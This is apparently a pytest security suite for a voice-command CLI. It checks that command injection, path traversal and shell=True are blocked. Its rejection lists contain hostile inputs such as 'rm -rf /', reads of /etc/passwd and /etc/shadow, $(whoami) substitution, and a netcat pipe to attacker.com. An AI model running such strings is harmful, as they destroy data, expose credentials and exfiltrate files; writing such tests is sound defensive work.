"""Security tests for voice CLI."""

import sys
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

# Import after adding src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "bin"))
from voice_cli import SecureVoiceCLI, SecurityError


class TestSecureVoiceCLI:
    """Test security features of SecureVoiceCLI."""

    @pytest.fixture
    def cli(self):
        """Create a SecureVoiceCLI instance for testing."""
        with patch("voice_cli.VoskEngine"):
            return SecureVoiceCLI()

    def test_sanitize_input_normal(self, cli):
        """Test normal input sanitization."""
        assert cli._sanitize_input("lista file") == "lista file"
        assert cli._sanitize_input("  LISTA FILE  ") == "lista file"
        assert cli._sanitize_input("") == ""

    def test_sanitize_input_dangerous_characters(self, cli):
        """Test detection of dangerous characters."""
        dangerous_inputs = [
            "lista; rm -rf /",
            "lista && cat /etc/passwd",
            "lista | nc attacker.com 9999",
            "lista `rm -rf /`",
            "lista $(whoami)",
            "lista > /etc/passwd",
            "lista < /etc/shadow",
            'lista "dangerous"',
            "lista 'dangerous'",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(SecurityError, match="Dangerous character detected"):
                cli._sanitize_input(dangerous_input)

    def test_sanitize_input_too_long(self, cli):
        """Test input length validation."""
        long_input = "a" * 101
        with pytest.raises(SecurityError, match="Input too long"):
            cli._sanitize_input(long_input)

    def test_validate_directory_allowed(self, cli):
        """Test validation of allowed directories."""
        assert cli._validate_directory("home") is not None
        assert cli._validate_directory("tmp") == "/tmp"
        assert cli._validate_directory("documenti") is not None

    def test_validate_directory_disallowed(self, cli):
        """Test rejection of disallowed directories."""
        dangerous_dirs = [
            "/etc",
            "../../../etc",
            "/usr/bin",
            "../../.ssh",
            "/root",
            "$(whoami)",
            "`pwd`",
        ]

        for dangerous_dir in dangerous_dirs:
            assert cli._validate_directory(dangerous_dir) is None

    def test_validate_search_query_safe(self, cli):
        """Test validation of safe search queries."""
        assert cli._validate_search_query("test") == "test"
        assert cli._validate_search_query("file.txt") == "file.txt"
        assert cli._validate_search_query("my-file_2") == "my-file_2"

    def test_validate_search_query_dangerous(self, cli):
        """Test rejection of dangerous search queries."""
        dangerous_queries = [
            "../etc/passwd",
            "$(whoami)",
            "`rm -rf /`",
            "file; rm -rf /",
            "file && cat /etc/passwd",
            "file | nc attacker.com",
            "a" * 51,  # Too long
        ]

        for dangerous_query in dangerous_queries:
            assert cli._validate_search_query(dangerous_query) is None

    @patch("voice_cli.subprocess.run")
    def test_execute_safe_command_success(self, mock_run, cli):
        """Test safe command execution."""
        mock_run.return_value = Mock(stdout="output", stderr="", returncode=0)

        cli._execute_safe_command(["ls", "-la"])

        mock_run.assert_called_once_with(
            ["ls", "-la"],
            shell=False,
            check=True,
            capture_output=True,
            text=True,
            timeout=10,
        )

    @patch("voice_cli.subprocess.run")
    def test_execute_safe_command_timeout(self, mock_run, cli):
        """Test command timeout handling."""
        from subprocess import TimeoutExpired

        mock_run.side_effect = TimeoutExpired(["sleep", "20"], 10)

        # Should not raise exception, just log and print error
        cli._execute_safe_command(["sleep", "20"])

        mock_run.assert_called_once()

    def test_process_voice_command_safe_command(self, cli):
        """Test processing of safe predefined commands."""
        with patch.object(cli, "_execute_safe_command") as mock_execute:
            cli.process_voice_command("lista file")
            mock_execute.assert_called_once_with(["ls", "-la"])

    def test_process_voice_command_dangerous_input(self, cli):
        """Test rejection of dangerous voice commands."""
        with patch("builtins.print") as mock_print:
            cli.process_voice_command("lista; rm -rf /")

            # Should print security violation
            mock_print.assert_called()
            call_args = str(mock_print.call_args)
            assert "Security violation" in call_args

    @patch("voice_cli.os.chdir")
    def test_process_voice_command_directory_change_safe(self, mock_chdir, cli):
        """Test safe directory change command."""
        with patch("builtins.print") as mock_print:
            cli.process_voice_command("vai in home")

            mock_chdir.assert_called_once()
            # Should print success message
            mock_print.assert_called()

    def test_process_voice_command_directory_change_dangerous(self, cli):
        """Test rejection of dangerous directory change."""
        with patch("builtins.print") as mock_print:
            cli.process_voice_command("vai in ../../etc")

            # Should print error message
            mock_print.assert_called()
            call_args = str(mock_print.call_args)
            assert "not allowed" in call_args or "not found" in call_args

    @patch("voice_cli.subprocess.run")
    def test_process_voice_command_search_safe(self, mock_run, cli):
        """Test safe search command."""
        mock_run.return_value = Mock(stdout="found files", stderr="", returncode=0)

        cli.process_voice_command("cerca test")

        mock_run.assert_called_once_with(
            ["find", ".", "-name", "*test*", "-type", "f"],
            shell=False,
            check=True,
            capture_output=True,
            text=True,
            timeout=10,
        )

    def test_process_voice_command_search_dangerous(self, cli):
        """Test rejection of dangerous search query."""
        with patch("builtins.print") as mock_print:
            cli.process_voice_command("cerca ../etc/passwd")

            # Should print error message
            mock_print.assert_called()
            call_args = str(mock_print.call_args)
            assert "Invalid search query" in call_args

    def test_unrecognized_command(self, cli):
        """Test handling of unrecognized commands."""
        with patch("builtins.print") as mock_print:
            cli.process_voice_command("comando inesistente")

            # Should print "not recognized" message
            mock_print.assert_called()
            call_args = str(mock_print.call_args)
            assert "not recognized" in call_args


class TestSecurityRegression:
    """Regression tests for security vulnerabilities."""

    def test_no_shell_true_in_secure_cli(self):
        """Ensure no shell=True usage in secure CLI."""
        secure_cli_path = Path(__file__).parent.parent / "bin" / "voice_cli.py"
        content = secure_cli_path.read_text()

        # Check for actual shell=True usage (not in comments)
        lines = content.split("\n")
        for line in lines:
            stripped = line.strip()
            if (
                "shell=True" in stripped
                and not stripped.startswith("#")
                and not stripped.startswith('"""')
            ):
                if "subprocess.run" in stripped:
                    pytest.fail(f"Found shell=True in subprocess call: {line}")

        # Should contain explicit shell=False
        assert "shell=False" in content

    def test_no_string_formatting_in_commands(self):
        """Ensure no dangerous string formatting in commands."""
        secure_cli_path = Path(__file__).parent.parent / "bin" / "voice_cli.py"
        content = secure_cli_path.read_text()

        # Should not contain f-string in subprocess calls
        lines = content.split("\n")
        for i, line in enumerate(lines):
            if "subprocess.run" in line:
                # Check this line and a few around it for dangerous patterns
                context = "\n".join(lines[max(0, i - 2) : i + 3])
                assert 'f"' not in context or "subprocess.run" not in context
                assert "f'" not in context or "subprocess.run" not in context
